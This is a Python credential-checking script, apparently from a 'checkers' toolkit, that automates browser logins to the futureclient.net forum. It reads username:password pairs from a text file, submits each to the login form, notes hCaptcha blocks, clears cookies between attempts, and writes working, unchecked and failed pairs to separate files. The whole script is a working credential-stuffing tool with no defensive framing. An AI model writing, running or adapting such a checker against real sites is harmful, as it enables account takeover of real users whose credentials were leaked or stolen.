from checkers.util.future.util import page, url, bad_url, check_url
from checkers.util.main.util import  r_0_2_0_3
from colorama import Fore
import time

print('start in 3...')
time.sleep(1)
print('start in 2..')
time.sleep(1)
print('start in 1.')
time.sleep(0.5)

# Выводим текст с градиентом
print('loading')
print()

#Split_string
def split_string(input_string):
    pairs = input_string.splitlines()
    credentials = []
    for pair in pairs:
        parts = pair.split(':')
        if len(parts) == 2:
            before = parts[0].strip()
            after = parts[1].strip()
            credentials.append((before, after))
    return credentials

#open output file
with open('../txt/output_future.txt', 'r', encoding='utf-8') as file:
    input_str = file.read()

credentials_list = split_string(input_str)
saved_credentials = []
bad_credentials = []
unchecked_credentials = []

#Page
def check_login(page, username, password):
 page.get(url=url, timeout=3)
 page.set.timeouts(1)
 time.sleep(r_0_2_0_3)
#Click on login button
 if page.ele('@href=https://www.futureclient.net/forum/member.php?action=login'):
  login_button = page.ele('@href=https://www.futureclient.net/forum/member.php?action=login')
  login_button.click()

#Logic for valid checking
  page.ele('#quick_login_username', timeout=1).input(username)
  page.ele('#quick_login_password', timeout=1).input(password)
  page.ele('@name=submit', timeout=1).click()

  if page.ele('@class=cb-i'):
   p = page.ele('@class=cb-i')
   p.click()

  if page.ele('@class=logout', timeout=1):
   return True
  if page.ele('#captcha_trow', timeout=1):
    print("[🛡] hCaptcha detected, retrying login...")
    return False

  return False
#Logic for bad_credentials & saved_credentials & unchecked_credentials & bad_credentials
for username, password in credentials_list:
 try:
  if check_login(page, username, password) and page.url == check_url and page.ele('#shoutbox', timeout=1):
   saved_credentials.append((username, password))
   print(Fore.GREEN + f"[✓] Successful login: {username}:{password}")
   #print()
  elif page.ele('#captcha_trow', timeout=1) and page.url == bad_url:
      unchecked_credentials.append((username, password))
  elif page.url == bad_url:
    bad_credentials.append((username, password))
    print(Fore.RED + f"[✖] Unsuccessful entry: {username}:{password}")
    #print()
#Clear cookies
  page.set.cookies.clear()

#Saving credentials
 except Exception as e:
  bad_credentials.append((username, password))
  print(f"[✖] Error: {username}: {e}")
  print()


with open('../txt/valid_future.txt', 'w', encoding='utf-8') as f:
 for cred in saved_credentials:
  f.write(f"{cred[0]}:{cred[1]}\n")

with open('../txt/unchecked_future.txt', 'w', encoding='utf-8') as f:
 for cred in unchecked_credentials:
  f.write(f"{cred[0]}:{cred[1]}\n")

with open('../txt/badaccs_future.txt', 'w', encoding='utf-8') as f:
 for cred in bad_credentials:
  f.write(f"{cred[0]}:{cred[1]}\n")

page.close()